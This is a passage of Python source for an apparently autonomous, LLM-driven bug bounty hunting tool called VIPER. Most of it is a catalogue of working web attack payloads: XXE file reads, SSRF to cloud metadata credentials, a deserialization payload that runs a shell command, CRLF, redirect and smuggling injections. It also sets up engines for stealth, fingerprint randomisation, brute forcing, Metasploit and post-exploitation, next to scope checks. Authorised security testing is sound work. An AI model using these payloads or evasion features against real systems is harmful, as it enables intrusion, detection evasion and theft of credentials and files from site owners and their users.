                    "/main.js.map", "/app.js.map", "/bundle.js.map",
                    "/vendor.js.map", "/runtime.js.map", "/chunk.js.map",
                    "/static/js/main.js.map", "/static/js/bundle.js.map",
                    "/assets/index.js.map", "/dist/main.js.map",
                    "/build/static/js/main.chunk.js.map",
                    "/webpack.config.js", "/.webpack/",
                ],
                indicators=["http", "js", "react", "angular", "vue", "webpack"],
                success_markers=[
                    r"\"version\"\s*:\s*3", r"\"sources\"", r"\"mappings\"",
                    r"\"sourcesContent\"", r"\"file\"",
                    r"webpack://", r"module\.exports",
                ],
                failure_markers=["404", "Not Found"],
                followups=["env_file"]
            ),
            Attack(
                name="graphql_introspection",
                category="recon",
                payloads=[
                    '{"query":"{ __schema { types { name fields { name } } } }"}',
                    '{"query":"{ __schema { queryType { name } mutationType { name } } }"}',
                    '{"query":"{ __type(name: \\"User\\") { fields { name type { name } } } }"}',
                    '{"query":"query IntrospectionQuery { __schema { types { name kind description fields(includeDeprecated: true) { name } } } }"}',
                ],
                indicators=["graphql", "gql", "query", "mutation", "api"],
                success_markers=[
                    r"__schema", r"__type", r"\"types\"",
                    r"\"queryType\"", r"\"mutationType\"",
                    r"\"fields\"", r"\"name\".*\"kind\"",
                ],
                failure_markers=["introspection.*disabled", "not allowed", "forbidden"],
                followups=["graphql_injection"]
            ),
            Attack(
                name="graphql_injection",
                category="injection",
                payloads=[
                    '{"query":"{ users { id email password } }"}',
                    '{"query":"mutation { register(email:\\"test@test.com\\", password:\\"test\\") { token } }"}',
                    '{"query":"{ user(id: 1) { email password apiKey } }"}',
                    '{"query":"query { search(term: \\"\\\\\\") { id } }"}',
                ],
                indicators=["graphql", "gql", "query", "graphql_introspection"],
                success_markers=[
                    r"\"password\"", r"\"email\"", r"\"token\"",
                    r"\"apiKey\"", r"\"secret\"",
                    r"syntax error", r"Cannot query field",
                ],
                failure_markers=["forbidden", "unauthorized"],
                followups=["sqli_error"]
            ),
            Attack(
                name="xxe_basic",
                category="injection",
                payloads=[
                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>',
                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo>test</foo>',
                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
                ],
                indicators=["xml", "soap", "feed", "rss", "svg", "upload", "import"],
                success_markers=[
                    r"root:x?:\d+:\d+", r"/bin/(?:ba)?sh",
                    r"\[extensions\]", r"\[fonts\]",
                    r"ami-id", r"instance-id",
                ],
                failure_markers=["parsing error", "not well-formed", "entities.*not allowed"],
                followups=["ssrf_basic", "lfi_basic"]
            ),
            Attack(
                name="crlf_injection",
                category="injection",
                payloads=[
                    "%0d%0aSet-Cookie:viper=crlf",
                    "%0d%0aX-Injected:viper-crlf-test",
                    "%0d%0a%0d%0a<script>alert(1)</script>",
                    "%E5%98%8A%E5%98%8DSet-Cookie:viper=crlf",
                    "%0d%0aLocation:https://evil.com",
                    "%0aX-Injected:viper",
                    "%0dX-Injected:viper",
                ],
                indicators=["redirect", "url", "next", "return", "goto", "callback", "header"],
                success_markers=[
                    r"Set-Cookie.*viper=crlf",
                    r"X-Injected.*viper",
                    r"viper-crlf-test",
                ],
                failure_markers=["blocked", "invalid"],
                followups=["xss_reflected", "open_redirect_basic"]
            ),
            Attack(
                name="host_header_injection",
                category="injection",
                payloads=[
                    "evil.com", "evil.com:80", "evil.com%00original.com",
                    "localhost", "127.0.0.1",
                ],
                indicators=["http", "host", "password", "reset", "forgot", "email"],
                success_markers=[
                    r"evil\.com", r"localhost.*reset",
                    r"127\.0\.0\.1.*link", r"password.*reset.*evil",
                    r"<a[^>]*evil\.com",
                ],
                failure_markers=["invalid host", "not recognized"],
                followups=["open_redirect_basic"]
            ),
            Attack(
                name="subdomain_takeover",
                category="recon",
                payloads=[
                    "NXDOMAIN", "NoSuchBucket",
                    "There isn't a GitHub Pages site here",
                    "herokucdn.com", "herokuapp.com",
                    "The specified bucket does not exist",
                    "Repository not found", "No such app",
                    "PROJECT_NOT_FOUND",
                    "Fastly error: unknown domain",
                    "Help Center Closed",
                ],
                indicators=["http", "subdomain", "cname"],
                success_markers=[
                    r"NoSuchBucket", r"NXDOMAIN",
                    r"There isn't a GitHub Pages",
                    r"No such app", r"unknown domain",
                    r"The specified bucket does not exist",
                ],
                failure_markers=["200 OK"],
                followups=[]
            ),
            Attack(
                name="verb_tampering",
                category="auth",
                payloads=["PATCH", "DELETE", "PUT", "TRACE", "OPTIONS", "CONNECT", "PROPFIND"],
                indicators=["admin", "api", "rest", "delete", "update", "edit"],
                success_markers=[
                    r"admin", r"dashboard", r"deleted", r"updated",
                    r"TRACE.*HTTP",
                    r"Allow:.*PUT", r"Allow:.*DELETE",
                ],
                failure_markers=["Method Not Allowed", "405", "403"],
                followups=["auth_bypass_header"]
            ),
            Attack(
                name="open_redirect_basic",
                category="injection",
                payloads=[
                    "https://evil.com", "//evil.com", "/\\evil.com",
                    "https://evil.com%00.target.com",
                    "https://evil.com?.target.com",
                    "https://evil.com@target.com",
                    "////evil.com", "https:evil.com",
                    "//evil%E3%80%82com",
                ],
                indicators=["redirect", "url", "next", "return", "goto", "continue", "dest", "redir", "callback", "forward"],
                success_markers=[
                    r"Location.*evil\.com",
                    r"window\.location.*evil",
                    r"meta.*refresh.*evil",
                ],
                failure_markers=["blocked", "invalid url", "not allowed"],
                followups=["xss_reflected"]
            ),
            Attack(
                name="cors_check",
                category="misc",
                payloads=[
                    "Origin: https://evil.com",
                    "Origin: null",
                    "Origin: https://target.com.evil.com",
                ],
                indicators=["http", "api", "json", "rest"],
                success_markers=[
                    r"Access-Control-Allow-Origin.*evil",
                    r"Access-Control-Allow-Origin.*null",
                    r"Access-Control-Allow-Credentials.*true",
                ],
                failure_markers=[],
                followups=[]
            ),
            Attack(
                name="cache_poisoning",
                category="injection",
                payloads=[
                    "X-Forwarded-Host: evil.com",
                    "X-Forwarded-Scheme: nothttps",
                    "X-Original-URL: /admin",
                    "X-Rewrite-URL: /admin",
                    "X-Host: evil.com",
                ],
                indicators=["http", "cdn", "cache", "cloudflare", "akamai", "fastly", "varnish"],
                success_markers=[
                    r"evil\.com", r"/admin",
                    r"X-Cache.*HIT", r"Age:\s*\d+",
                ],
                failure_markers=["blocked", "forbidden"],
                followups=["xss_reflected"]
            ),
            Attack(
                name="prototype_pollution",
                category="injection",
                payloads=[
                    "__proto__[polluted]=true",
                    "constructor[prototype][polluted]=true",
                    "__proto__.polluted=true",
                    '{"__proto__":{"polluted":"true"}}',
                    "__proto__[isAdmin]=true",
                ],
                indicators=["json", "merge", "extend", "assign", "node", "express", "javascript"],
                success_markers=[
                    r"polluted.*true", r"isAdmin.*true",
                    r"\"polluted\"", r"prototype",
                ],
                failure_markers=["invalid", "blocked"],
                followups=["xss_reflected"]
            ),
            Attack(
                name="insecure_deserialization",
                category="injection",
                payloads=[
                    "rO0ABXNyABFqYXZhLmxhbmcuSW50ZWdlcg==",
                    'O:8:"stdClass":1:{s:4:"test";s:5:"viper";}',
                    'a:1:{s:4:"test";s:5:"viper";}',
                    "gASVJAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg==",
                    '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\')}()"}',
                ],
                indicators=["serialize", "object", "viewstate", "pickle", "marshal", "java", "base64", "cookie"],
                success_markers=[
                    r"uid=\d+", r"root:", r"www-data",
                    r"ClassNotFoundException", r"java\.io",
                    r"unserialize", r"__wakeup",
                    r"unpickle", r"pickle",
                ],
                failure_markers=["invalid", "blocked", "deserialization.*error"],
                followups=["cmdi_basic"]
            ),
            Attack(
                name="ssrf_basic",
                category="injection",
                payloads=[
                    "http://169.254.169.254/latest/meta-data/",
                    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                    "http://metadata.google.internal/computeMetadata/v1/",
                    "http://100.100.100.200/latest/meta-data/",
                    "http://127.0.0.1:22/", "http://127.0.0.1:3306/",
                    "http://127.0.0.1:6379/", "http://127.0.0.1:27017/",
                    "http://localhost:8080/", "http://localhost:9200/",
                    "http://[::1]/", "http://0x7f000001/",
                    "file:///etc/passwd", "file:///etc/hostname",
                    "gopher://127.0.0.1:6379/_INFO",
                    "dict://127.0.0.1:6379/info",
                ],
                indicators=["url", "uri", "src", "href", "fetch", "load", "proxy", "forward", "request", "link", "webhook"],
                success_markers=[
                    r"ami-id", r"instance-id", r"security-credentials",
                    r"computeMetadata", r"access_token",
                    r"root:x?:\d+:\d+", r"SSH-\d+",
                    r"redis_version", r"MongoDB",
                    r"elasticsearch",
                ],
                failure_markers=["blocked", "not allowed", "invalid url", "SSRF"],
                followups=["lfi_basic"]
            ),
            Attack(
                name="request_smuggling",
                category="injection",
                payloads=[
                    "Transfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target\r\n\r\n",
                    "Content-Length: 0\r\nTransfer-Encoding: chunked",
                    "Transfer-Encoding: chunked\r\nTransfer-encoding: x",
                ],
                indicators=["http", "proxy", "cdn", "load balancer", "nginx", "haproxy"],
                success_markers=[
                    r"admin", r"smuggled",
                    r"two responses", r"desync",
                ],
                failure_markers=["400 Bad Request", "blocked"],
                followups=["auth_bypass_header"]
            ),
        ]

        for attack in attacks_data:
            self.attacks[attack.name] = attack

        # Extend payloads from wordlist files if available
        wordlist_map = {
            "lfi_basic": "lfi-payloads.txt",
        }
        wordlists_dir = Path(__file__).parent / "wordlists"
        for attack_name, wl_file in wordlist_map.items():
            wl_path = wordlists_dir / wl_file
            if wl_path.exists() and attack_name in self.attacks:
                extra = [
                    line.strip()
                    for line in wl_path.read_text(errors="ignore").splitlines()
                    if line.strip() and not line.startswith("#")
                ]
                existing = set(self.attacks[attack_name].payloads)
                self.attacks[attack_name].payloads.extend(
                    p for p in extra if p not in existing
                )

        # Tech signatures
        self.tech_signatures = {
            "php": ["php", "<?php", ".php", "PHPSESSID"],
            "asp": [".asp", ".aspx", "ASP.NET", "__VIEWSTATE"],
            "java": [".jsp", ".do", "JSESSIONID", "java", "tomcat"],
            "python": ["python", "django", "flask", "werkzeug"],
            "node": ["express", "node", "npm"],
            "wordpress": ["wp-content", "wp-includes", "wordpress"],
            "nginx": ["nginx"],
            "apache": ["apache", "httpd"],
            "iis": ["iis", "asp.net"],
        }
    
    def _load(self):
        """Load saved knowledge"""
        if KNOWLEDGE_FILE.exists():
            try:
                data = json.loads(KNOWLEDGE_FILE.read_text())
                for name, stats in data.get("attack_stats", {}).items():
                    if name in self.attacks:
                        self.attacks[name].attempts = stats.get("attempts", 0)
                        self.attacks[name].successes = stats.get("successes", 0)
                self.successful_chains = data.get("successful_chains", [])
                self.target_history = data.get("target_history", {})
            except:
                pass
    
    def save(self):
        """Save knowledge"""
        data = {
            "attack_stats": {
                name: {"attempts": a.attempts, "successes": a.successes}
                for name, a in self.attacks.items()
            },
            "successful_chains": self.successful_chains[-100:],
            "target_history": dict(list(self.target_history.items())[-500:])
        }
        KNOWLEDGE_FILE.write_text(json.dumps(data, indent=2))
    
    def get_attacks_for_context(self, target: Target) -> List[str]:
        """Get relevant attacks for this target"""
        relevant = []
        
        url_lower = target.url.lower()
        techs = " ".join(target.technologies).lower()
        params = " ".join(target.parameters).lower()
        context = f"{url_lower} {techs} {params}"
        
        for name, attack in self.attacks.items():
            if not target.should_try_attack(name):
                continue
            
            for indicator in attack.indicators:
                if indicator.lower() in context:
                    relevant.append(name)
                    break
        
        relevant.sort(key=lambda n: self.attacks[n].success_rate, reverse=True)
        
        return relevant
    
    def get_followup_attacks(self, successful_attack: str) -> List[str]:
        """Get what to try next after a successful attack"""
        attack = self.attacks.get(successful_attack)
        if attack:
            return attack.followups
        return []
    
    def record_result(self, attack_name: str, success: bool, target_url: str):
        """Record attack result for learning"""
        if attack_name in self.attacks:
            self.attacks[attack_name].attempts += 1
            if success:
                self.attacks[attack_name].successes += 1
    
    def detect_technologies(self, content: str, headers: Dict) -> Set[str]:
        """Detect technologies from response"""
        techs = set()
        combined = f"{content} {json.dumps(headers)}".lower()
        
        for tech, signatures in self.tech_signatures.items():
            for sig in signatures:
                if sig.lower() in combined:
                    techs.add(tech)
                    break
        
        return techs


class ViperCore:
    """
    Autonomous Bug Bounty Hunter.
    
    Orchestrates:
    1. Reconnaissance (subdomains, ports, technologies)
    2. Surface Mapping (parameters, APIs, JS analysis)
    3. Nuclei Scanning (known vulnerabilities)
    4. Manual Attack Execution (custom payloads)
    5. LLM Analysis (triage, strategy)
    6. Reporting
    """
    
    def __init__(self):
        self.knowledge = ViperKnowledge()
        self.session: Optional[aiohttp.ClientSession] = None
        self.current_target: Optional[Target] = None
        self._brain = None  # Optional ViperBrain for adaptive learning
        self._react_engine = None  # ReACT reasoning loop (LLM-powered)

        # Stealth engine (initialized before HTTP client)
        self.stealth = None
        if STEALTH_AVAILABLE:
            self.stealth = StealthEngine(level=0)
            self.log("[Stealth] Engine loaded (level 0 — use set_stealth_level() to activate)")

        # VIPER 2.0: Initialize upgrade components
        if UPGRADE_AVAILABLE:
            self.tool_manager = ToolManager(auto_detect=True)
            self.http_client = HackerHTTPClient(
                requests_per_second=5.0, verify_ssl=False,
            )
            try:
                self.db = ViperDB()
            except Exception as e:
                self.log(f"[ERROR] ViperDB init failed: {e} — findings will NOT be saved!", "ERROR")
                self.db = None
            self.validator = FindingValidator(self.http_client)
            self.poc_gen = PoCGenerator()
        else:
            self.tool_manager = None
            self.http_client = None
            self.db = None
            self.validator = None
            self.poc_gen = None

        # GVM/OpenVAS scanner (optional, graceful skip)
        self.gvm_scanner = None
        if GVM_AVAILABLE:
            self.gvm_scanner = GVMScanner(verbose=True)
            self.log("[GVM] Scanner module loaded (availability checked at scan time)")

        # Secret scanner
        if SECRET_SCANNER_AVAILABLE:
            self.secret_scanner = SecretScanner(verbose=True)
        else:
            self.secret_scanner = None

        # Notifier (Telegram alerts via Clawdbot)
        self.notifier = None
        if NOTIFIER_AVAILABLE:
            self.notifier = Notifier(gateway_url="http://localhost:1999", enabled=True)
            self.log("[Notifier] Telegram alerts enabled via Clawdbot gateway")

        # Initialize modules
        if MODULES_AVAILABLE:
            self.recon_engine = ReconEngine(verbose=True)
            self.surface_mapper = SurfaceMapper(verbose=True)
            self.nuclei_scanner = NucleiScanner(
                verbose=True,
                tool_manager=self.tool_manager if UPGRADE_AVAILABLE else None,
            )
            self.llm_analyzer = LLMAnalyzer(verbose=True)
            self.scope_manager = ScopeManager(verbose=True)
        else:
            self.recon_engine = None
            self.surface_mapper = None
            self.nuclei_scanner = None
            self.llm_analyzer = None
            self.scope_manager = None

        # ReACT Engine: LLM-powered reasoning loop for manual attack phase
        try:
            from core.react_engine import ReACTEngine
            from ai.model_router import ModelRouter
            router = ModelRouter()
            if router.is_available:
                # Initialize ViperBrain for Q-learning fallback
                try:
                    from viper_brain import ViperBrain
                    self._brain = ViperBrain()
                except Exception:
                    pass
                if self._brain:
                    self._react_engine = ReACTEngine(
                        brain=self._brain,
                        model_router=router,
                        max_steps=15,
                        verbose=True,
                    )
                    self.log("[ReACT] Engine initialized with LLM reasoning", "INFO")
                else:
                    self.log("[ReACT] No ViperBrain available, ReACT disabled", "WARN")
            else:
                self.log("[ReACT] No LLM configured (set VIPER_MODEL + API key), using Q-learning only", "INFO")
        except ImportError as e:
            self.log(f"[ReACT] Not available: {e}", "INFO")

        # EvoGraph: cross-session attack memory
        self.evograph = None
        self._evograph_session_id = None
        if EVOGRAPH_AVAILABLE:
            try:
                self.evograph = EvoGraph()
                self.log("[EvoGraph] Cross-session memory initialized", "INFO")
                # Seed brain with best historical Q-table
                if self._brain and self.evograph:
                    best_q = self.evograph.load_best_q_table()
                    if best_q:
                        for state, actions in best_q.items():
                            if state not in self._brain.q_table:
                                self._brain.q_table[state] = {}
                            for action, val in actions.items():
                                existing = self._brain.q_table[state].get(action, 0)
                                self._brain.q_table[state][action] = max(existing, val)
                        self.log(f"[EvoGraph] Loaded best Q-table ({len(best_q)} states)", "INFO")
                    # Share evograph reference with brain for choose_attack queries
                    self._brain.evograph = self.evograph
                if self._react_engine:
                    self._react_engine.evograph = self.evograph
            except Exception as e:
                self.log(f"[EvoGraph] Init failed: {e}", "WARN")

        # VIPER 3.0: Phase-aware execution engine
        self.phase_engine = None
        if PHASE_ENGINE_AVAILABLE:
            try:
                self.phase_engine = PhaseEngine()
                self.log("[PhaseEngine] Phase-aware execution engine loaded", "INFO")
            except Exception as e:
                self.log(f"[PhaseEngine] Init failed: {e}", "WARN")

        # VIPER 3.0: Attack graph
        self.attack_graph = None
        if ATTACK_GRAPH_AVAILABLE:
            try:
                self.attack_graph = AttackGraph()
                self.log("[AttackGraph] In-memory graph database loaded", "INFO")
            except Exception as e:
                self.log(f"[AttackGraph] Init failed: {e}", "WARN")

        # VIPER 3.0: Web crawler
        self.web_crawler = None
        if WEB_CRAWLER_AVAILABLE:
            try:
                self.web_crawler = WebCrawler()
                self.log("[WebCrawler] Crawler + JS analysis engine loaded", "INFO")
            except Exception as e:
                self.log(f"[WebCrawler] Init failed: {e}", "WARN")

        # VIPER 3.0: LLM guardrails
        self.guardrail = None
        self.input_sanitizer = None
        if GUARDRAILS_AVAILABLE:
            try:
                self.guardrail = TargetGuardrail()
                self.input_sanitizer = InputSanitizer()
                self.log("[Guardrails] Target validation + input sanitization loaded", "INFO")
            except Exception as e:
                self.log(f"[Guardrails] Init failed: {e}", "WARN")

        # VIPER 3.0: Brute force engine
        self.brute_forcer = None
        if BRUTE_FORCER_AVAILABLE:
            try:
                self.brute_forcer = BruteForcer()
                self.log("[BruteForcer] Brute force engine loaded", "INFO")
            except Exception as e:
                self.log(f"[BruteForcer] Init failed: {e}", "WARN")

        # VIPER 3.0: Metasploit integration
        self.metasploit = None
        if METASPLOIT_AVAILABLE:
            try:
                self.metasploit = MetasploitClient()
                self.log("[Metasploit] Integration loaded (connects on demand)", "INFO")
            except Exception as e:
                self.log(f"[Metasploit] Init failed: {e}", "WARN")

        # VIPER 3.0: Code remediation agent
        self.codefix_agent = None
        if CODEFIX_AVAILABLE:
            try:
                self.codefix_agent = CodeFixAgent()
                self.log("[CodeFix] Remediation agent loaded", "INFO")
            except Exception as e:
                self.log(f"[CodeFix] Init failed: {e}", "WARN")

        # VIPER 3.0: Post-exploitation framework
        self.post_exploit = None
        if POST_EXPLOIT_AVAILABLE:
            try:
                self.post_exploit = PostExploitAgent()
                self.log("[PostExploit] Post-exploitation framework loaded", "INFO")
            except Exception as e:
                self.log(f"[PostExploit] Init failed: {e}", "WARN")

        # ══════════════════════════════════════════════════════════════
        # VIPER 4.0: Initialize new engines
        # ══════════════════════════════════════════════════════════════

        # Settings manager
        self.settings = None
        if SETTINGS_AVAILABLE:
            try:
                self.settings = SettingsManager()
                # Apply settings
                if self.settings.get('max_requests_per_second'):
                    self._rate_limit = self.settings.get('max_requests_per_second')
                self.log("[Settings] Manager loaded", "INFO")
            except Exception as e:
                self.log(f"[Settings] Init failed: {e}", "WARN")

        # Knowledge Graph Engine (dual-backend: Neo4j or SQLite+networkx)
        self.graph_engine = None
        self.chain_writer = None
        self.graph_query = None
        if GRAPH_ENGINE_AVAILABLE:
            try:
                self.graph_engine = GraphEngine()
                self.chain_writer = ChainWriter(self.graph_engine)
                self.graph_query = GraphQueryEngine(self.graph_engine)
                self.log(f"[GraphEngine] {self.graph_engine}", "INFO")
            except Exception as e:
                self.log(f"[GraphEngine] Init failed: {e}", "WARN")

        # Wappalyzer tech fingerprinting (6K+ rules)
        self.wappalyzer = None
        if ENHANCED_RECON_AVAILABLE:
            try:
                self.wappalyzer = Wappalyzer()
                self.log(f"[Wappalyzer] Loaded {len(self.wappalyzer.technologies)} technology signatures", "INFO")
            except Exception as e:
                self.log(f"[Wappalyzer] Init failed: {e}", "WARN")

        # MITRE enricher (offline CWE/CAPEC database)
        self.mitre_enricher = None
        if ENHANCED_RECON_AVAILABLE:
            try:
                self.mitre_enricher = MitreEnricher()
                self.log("[MITRE] CWE/CAPEC enricher loaded", "INFO")
            except Exception as e:
                self.log(f"[MITRE] Init failed: {e}", "WARN")

        # MCP Tool Interface
        self.mcp_tools = None
        if MCP_TOOLS_AVAILABLE:
            try:
                self.mcp_tools = MCPToolInterface(mode="auto")
                self.log(f"[MCP] Tool interface loaded ({len(self.mcp_tools.get_available_tools())} tools)", "INFO")
            except Exception as e:
                self.log(f"[MCP] Init failed: {e}", "WARN")

        # Orchestrator (pure-Python state machine replacing ReACT for v4 mode)
        self.orchestrator = None
        if ORCHESTRATOR_AVAILABLE and self.graph_engine:
            try:
                from core.approval_gate import ApprovalGate
                self.orchestrator = ViperOrchestrator(
                    graph_engine=self.graph_engine,
                    model_router=getattr(self._react_engine, 'router', None) if self._react_engine else None,
                    chain_writer=self.chain_writer,
                    guardrail=self.guardrail if GUARDRAILS_AVAILABLE else None,
                    enable_agents=AGENT_BUS_AVAILABLE,
                )
                self.log("[Orchestrator] VIPER 5.0 state machine loaded (agents=%s)" % AGENT_BUS_AVAILABLE, "INFO")
            except Exception as e:
                self.log(f"[Orchestrator] Init failed: {e}", "WARN")

        # ── VIPER 5.0: New subsystems ──

        # Failure Analyzer (self-learning from failed attacks)
        self.failure_analyzer = None
        if FAILURE_ANALYZER_AVAILABLE:
            try:
                self.failure_analyzer = FailureAnalyzer()
                self.log("[FailureAnalyzer] Loaded (%d historical lessons)" % len(self.failure_analyzer.lessons), "INFO")
            except Exception as e:
                self.log(f"[FailureAnalyzer] Init failed: {e}", "WARN")

        # Cross-Target Correlator
        self.cross_correlator = None
        if CROSS_CORRELATOR_AVAILABLE:
            try:
                self.cross_correlator = CrossTargetCorrelator(
                    viper_db=self.db if UPGRADE_AVAILABLE else None,
                    evograph=self.evograph if EVOGRAPH_AVAILABLE else None,
                )
                self.log("[CrossCorrelator] Loaded", "INFO")
            except Exception as e:
                self.log(f"[CrossCorrelator] Init failed: {e}", "WARN")

        # Chain of Custody (evidence integrity)
        self.chain_of_custody = None
        if CHAIN_OF_CUSTODY_AVAILABLE:
            try:
                self.chain_of_custody = ChainOfCustody()
                self.log("[ChainOfCustody] Evidence tracking enabled", "INFO")
            except Exception as e:
                self.log(f"[ChainOfCustody] Init failed: {e}", "WARN")

        # Finding Stream (real-time notifications)
        self.finding_stream = None
        if FINDING_STREAM_AVAILABLE:
            try:
                self.finding_stream = FindingStream()
                self.log("[FindingStream] Notification stream ready (%d channels)" % self.finding_stream.get_stats()["channels_configured"], "INFO")
            except Exception as e:
                self.log(f"[FindingStream] Init failed: {e}", "WARN")

        # Fingerprint Randomizer
        self.fingerprint_randomizer = None
        if FINGERPRINT_RANDOMIZER_AVAILABLE:
            try:
                self.fingerprint_randomizer = FingerprintRandomizer()
                self.log("[FingerprintRandomizer] TLS/HTTP fingerprint randomization enabled", "INFO")
            except Exception as e:
                self.log(f"[FingerprintRandomizer] Init failed: {e}", "WARN")

        # Human Timing Profile
        self.human_timing = None
        if HUMAN_TIMING_AVAILABLE:
            try:
                self.human_timing = HumanTimingProfile(profile="normal")
                self.log("[HumanTiming] Gaussian timing profile (NORMAL)", "INFO")
            except Exception as e:
                self.log(f"[HumanTiming] Init failed: {e}", "WARN")

        self.log("VIPER 5.0 initialization complete", "INFO")

        # Metrics
        self.metrics = {
            "total_requests": 0,
            "total_findings": 0,
            "validated_findings": 0,
            "false_positives_caught": 0,
            "sessions_run": 0,
            "uptime_seconds": 0,
            "start_time": None
        }

        self._load_state()
    
    def _load_state(self):
        """Load saved state from JSON"""
        if STATE_FILE.exists():
            try:
                state = json.loads(STATE_FILE.read_text())
                self.metrics = state.get("metrics", self.metrics)
            except (json.JSONDecodeError, KeyError, ValueError):
                pass

    def save_state(self):
        """Save state as JSON"""
        STATE_FILE.write_text(json.dumps({"metrics": self.metrics}, indent=2, default=str))
        self.knowledge.save()
        METRICS_FILE.write_text(json.dumps(self.metrics, indent=2, default=str))
    
    def set_stealth_level(self, level: int, proxies: Optional[List[str]] = None):
        """Set stealth level (0-3) and optionally provide proxy list."""
        if STEALTH_AVAILABLE:
            self.stealth = StealthEngine(level=level, proxies=proxies or [])
            if self.http_client:
                self.http_client.stealth = self.stealth
            self.log(f"[Stealth] Level set to {self.stealth.level.name} ({level})")
        else:
            self.log("[Stealth] Module not available", "WARN")

    def log(self, msg: str, level: str = "INFO"):
        """Log with timestamp"""
        timestamp = datetime.now().strftime('%H:%M:%S')
        line = f"[{timestamp}] [{level}] {msg}"
        print(line)
        
        log_file = LOGS_DIR / f"viper_{datetime.now().strftime('%Y%m%d')}.log"
        with open(log_file, 'a', encoding='utf-8') as f:
            f.write(line + '\n')
    
    async def request(self, url: str, method: str = "GET",
                      data: dict = None, headers: dict = None,
                      cookies: dict = None) -> Tuple[int, str, Dict]:
        """Make HTTP request with scope enforcement, rate limiting, and WAF detection."""
        self.metrics["total_requests"] += 1

        # Scope enforcement
        if self.scope_manager and self.scope_manager.active_scope:
            try:
                self.scope_manager.enforce_before_request(url)
            except Exception as e:
                self.log(f"Scope blocked: {e}", "WARN")
                return 0, f"SCOPE_BLOCKED: {e}", {}

        # Use HackerHTTPClient if available (rate limiting + WAF detection)
        if self.http_client:
            try:
                result = await self.http_client.request(
                    method=method, url=url, headers=headers, data=data,
                )
                if result.waf_detected and self.db:
                    domain = urllib.parse.urlparse(url).netloc
                    self.db.set_waf(domain, result.waf_detected)
                return result.status, result.body, result.headers
            except Exception as e:
                return 0, str(e), {}

        # Fallback to raw aiohttp session
        try:
            kwargs = {
                'timeout': aiohttp.ClientTimeout(total=15),
                'ssl': False,
                'allow_redirects': True
            }
            if data:
                kwargs['data'] = data
            if headers:
                kwargs['headers'] = headers
            if cookies:
                kwargs['cookies'] = cookies

            async with self.session.request(method, url, **kwargs) as resp:
                body = await resp.text()
                return resp.status, body, dict(resp.headers)
        except asyncio.TimeoutError:
            return 0, "TIMEOUT", {}
        except Exception as e:
            return 0, str(e), {}
    
    # =====================
    # FULL BUG BOUNTY WORKFLOW
    # =====================
    
    async def full_hunt(self, target_url: str,
                         scope: BugBountyScope = None,
                         max_minutes: int = 30) -> Dict:
        """
        Execute full bug bounty hunting workflow.
        
        Phases:
        1. Scope validation
        2. Reconnaissance
        3. Surface mapping
        4. Nuclei scanning
        5. Manual attacks
        6. LLM analysis
        7. Report generation
        """
        start_time = datetime.now()
        end_time = start_time + timedelta(minutes=max_minutes)

        # Per-phase time budgets (minutes): recon 20%, surface 20%, nuclei 10%, manual 50%
        # Guarantee minimum 3 minutes for manual hunt
        manual_min = max(3.0, max_minutes * 0.5)
        remaining_budget = max_minutes - manual_min
        recon_budget = remaining_budget * 0.4   # ~20% of total
        surface_budget = remaining_budget * 0.4  # ~20% of total
        nuclei_budget = remaining_budget * 0.2   # ~10% of total

        target = Target(url=target_url)
        self.current_target = target
        domain = self._extract_domain(target_url)

        # VIPER 4.0: Register target in knowledge graph
        if self.graph_engine:
            self.graph_engine.add_target(domain)

        self.log(f"=== VIPER Full Hunt: {target_url} ===")
        self.log(f"Time limit: {max_minutes} min (recon={recon_budget:.1f}, surface={surface_budget:.1f}, nuclei={nuclei_budget:.1f}, manual={manual_min:.1f})")
        
        results = {
            "target": target_url,
            "start_time": start_time.isoformat(),
            "phases": {},
            "findings": [],
            "nuclei_findings": [],
            "access_level": 0
        }
        
        # Start HackerHTTPClient if available
        if self.http_client:
            await self.http_client.start()

        async with aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(ssl=False)
        ) as self.session:

            # Phase 1: Scope Check
            if scope and self.scope_manager:
                self.scope_manager.active_scope = scope
                in_scope, reason = self.scope_manager.is_in_scope(target_url)
                if not in_scope:
                    self.log(f"Target out of scope: {reason}", "WARN")
                    results["error"] = f"Out of scope: {reason}"
                    return results
            
            # Phase 1.5: Recon Pipeline (runs full chain before individual phases)
            if PIPELINE_AVAILABLE and self.settings.get("use_recon_pipeline", True):
                self.log("\n=== Phase 1.5: Recon Pipeline ===")
                try:
                    pipeline = ReconPipeline(
                        graph_engine=self.graph_engine,
                        session=self.session,
                        settings=self.settings,
                    )
                    pipeline_budget = min(recon_budget * 60 * 0.5, 300)  # max 5 min
                    recon_results = await asyncio.wait_for(
                        pipeline.run(target, timeout_minutes=pipeline_budget / 60),
                        timeout=pipeline_budget,
                    )
                    if recon_results.endpoints:
                        self.log(f"[Pipeline] Discovered {len(recon_results.endpoints)} endpoints")
                        # Merge pipeline endpoints into target
                        for ep in recon_results.endpoints:
                            target.technologies.add(ep) if hasattr(target, 'technologies') else None
                    if recon_results.technologies:
                        self.log(f"[Pipeline] Fingerprinted {len(recon_results.technologies)} technologies")
                    if recon_results.subdomains:
                        target.subdomains = target.subdomains | recon_results.subdomains if hasattr(target, 'subdomains') and target.subdomains else recon_results.subdomains
                    results["phases"]["pipeline"] = recon_results.to_dict()
                except asyncio.TimeoutError:
                    self.log("[Pipeline] Timed out, falling back to standard recon", "WARN")
                except Exception as e:
                    self.log(f"[Pipeline] Error: {e}", "WARN")

            # Phase 2: Reconnaissance (with timeout)
            if self.recon_engine and datetime.now() < end_time:
                self.log("\n=== Phase 2: Reconnaissance ===")
                try:
                    recon_result = await asyncio.wait_for(
                        self.recon_engine.full_recon(
                            self._extract_domain(target_url),
                            subdomain_enum=True,
